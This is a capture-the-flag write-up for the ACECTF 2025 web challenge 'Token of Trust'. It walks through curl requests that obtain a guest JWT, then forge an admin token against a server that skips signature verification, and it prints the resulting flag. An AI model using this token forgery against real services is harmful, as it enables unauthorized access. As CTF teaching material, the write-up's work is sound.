---
title: ACECTF 2025 - web - Token of Trust
date: 2025-02-28 20:00:00 +0530
categories: [CTF, acectf-2025]
tags: [web, jwt, authentication-bypass]     # TAG names should always be lowercase
description: JWT authentication bypass challenge
toc: true
# comments: false
# pin: true
# published: false
---

---
## Initial Analysis

### Challenge Description

```
At first, this web app seems straightforward, but there’s something hidden beneath the surface. It uses a token for authentication, but the way it verifies trust can be manipulated.

The secret lies in how the token is used. Can you find the key to unlock it?

Submit your answer in the following format: ACECTF{3x4mpl3_fl4g}
```

When visiting the URL, the response says:

```
Welcome to the main page!
To log in, visit /login. But remember, POST requests are my love language. 🧡

PS: Don't forget to set your headers for JSON, or I'll just ignore you. 🙃
```

## Authentication Process

Visiting `/login` returns:

```
Oops! Wrong approach.
You can't just waltz in here without a proper POST request.

Try sending a JSON payload like this: {"user":"ace","pass":"ctf"}.

Hint: I only care about your request format, not your credentials. 😉
```

The server expects a **POST request with JSON data** for authentication. Using `curl`, I sent the required payload:

```bash
➜  ~ curl -X POST http://webchall.com/login \
-H "Content-Type: application/json" \
-d '{"user": "ace", "pass": "ctf"}'
```

### Response:

```json
{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QifQ.JT3l4_NkVbkQuZpl62b9h8NCZ3cTcypEGZ1lULWR47M"}
```

The response contains a **JWT (JSON Web Token)**. Decoding it on [jwt.io](https://jwt.io/) reveals:

```json
{
  "user": "guest"
}
```

### Exploring Restricted Areas

Checking `/robots.txt` reveals:

```
Disallow: /flag (But hey, who listens to robots anyway?)
```

Attempting to access `/flag` results in:

```bash
➜  ~ curl -X POST http://webchall.com/flag
No token? No flag! Bring me a token, and we'll talk. 👀
```

It requires a **token**. Sending the obtained JWT:

```bash
➜  ~ curl -X POST http://webchall.com/flag \
-H "Content-Type: application/json" \
-d '{"token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QifQ.JT3l4_NkVbkQuZpl62b9h8NCZ3cTcypEGZ1lULWR47M"}'
```

Response:

```
Sorry, you're not the admin. No flag for you! 😝
```

The token identifies me as `guest`, so I need **admin access**.

## Exploiting the JWT

Since the token is a **JWT**, modifying the payload might grant admin access. The JWT uses **HMAC SHA256**, but it might not verify the signature properly.

By changing the `"user": "guest"` value to `"user": "admin"` and signing with a **random secret**, I created a modified token:

```bash
➜  ~ curl -X POST http://webchall.com/flag \
-H "Content-Type: application/json" \
-d '{"token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.FX63b1vgKrqIM-7xsuWOuEZmN0_jWJeFK-7qJqB6BDI"}'
```

Response:

```
ACECTF{jwt_cr4ck3d_4dm1n_4cce55_0bt41n3d!}
```

Flag obtained! 🎉

## Conclusion

This challenge demonstrates a **JWT authentication bypass** due to improper signature verification. The server only checks the token’s structure but does not validate the signature, allowing attackers to forge an admin token easily.


Hope this write-up helps in future CTF challenges! 🚀

